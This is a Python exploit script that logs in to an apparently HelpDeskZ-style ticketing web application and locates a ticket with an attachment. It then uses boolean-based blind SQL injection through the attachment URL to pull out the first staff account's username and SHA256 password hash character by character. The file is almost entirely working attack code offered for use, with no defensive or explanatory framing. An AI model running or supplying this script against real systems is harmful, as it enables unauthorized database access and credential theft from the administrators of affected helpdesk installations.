#!/usr/bin/python3

import requests
import sys
import re
import html 

if len(sys.argv) != 4:
	print("usage: python3 {} <base url> <email> <password>" .format(sys.argv[0]))
else:
	url = sys.argv[1]
	email = sys.argv[2]
	passwd = sys.argv[3]

#Getting CSRF token, logging in, verifying login
e = requests.session()
csrf = e.get(url)
token = re.search('name="csrfhash" value="(.*?)"', csrf.text)
s = e.post(url+"/?v=login", data = {"do":"login","csrfhash":token.group(1), "email":email, "password": passwd, "btn":"Login"})
if "My Profile" in s.text:
	print("Successfully logged in")
else:
	print("Login failed, exiting...")
	exit()

#scrape tickets to find attachments
for a in range(0,11):
	tixPage = e.get(url+"/?v=view_tickets&action=ticket&param[]={}" .format(a))
	if "Sorry, we couldn't find the ticket you requested or you do not have permission to view it." not in tixPage.text:
		if "<div><span class=\"knowledgebaseattachmenticon\"></span>" in tixPage.text:
			print("\nValid ticketID found: {}" .format(a))
			break
else:
	print("Could not find valid ticket . Please check that you uploaded an attachment")
	exit()

#scrape link to view attachment
scrapedTix = re.search('<div><span class="knowledgebaseattachmenticon"></span> <a href="(.*)" target=', tixPage.text)
target = html.unescape(scrapedTix.group(1))
print("\nTarget for SQLi = {}" .format(target))

#begin sql injection
charset = "abcdefghijklmnopqrstuvwxyz0123456789.-,/"


print("\n")

# find username
user = ""
for t in range(1,10):
	for c in charset:
		#tri = e.get(target + " and (ascii(substr((SeLeCt version()),{},1))) = {}--" .format(t,ord(c)))
		tri = e.get(target + ' AND (ascii(substr((SELECT username FROM staff LIMIT 0,1),{},1))) = {}--' .format(t,ord(c)))
		if "couldn't find" not in tri.text:
			user = user + c
			print("Username = {}".format(user), end="\r")
			break

print("\n")

#find password
pwd = ""
for t in range(1,65):
	for c in charset:
		#tri = e.get(target + " and (ascii(substr((SeLeCt version()),{},1))) = {}--" .format(t,ord(c)))
		tri = e.get(target + ' AND (ascii(substr((SELECT password FROM staff LIMIT 0,1),{},1))) = {}--' .format(t,ord(c)))
		if "couldn't find" not in tri.text:
			pwd = pwd + c
			print("Password in SHA256 = {}".format(pwd), end="\r")	
			break

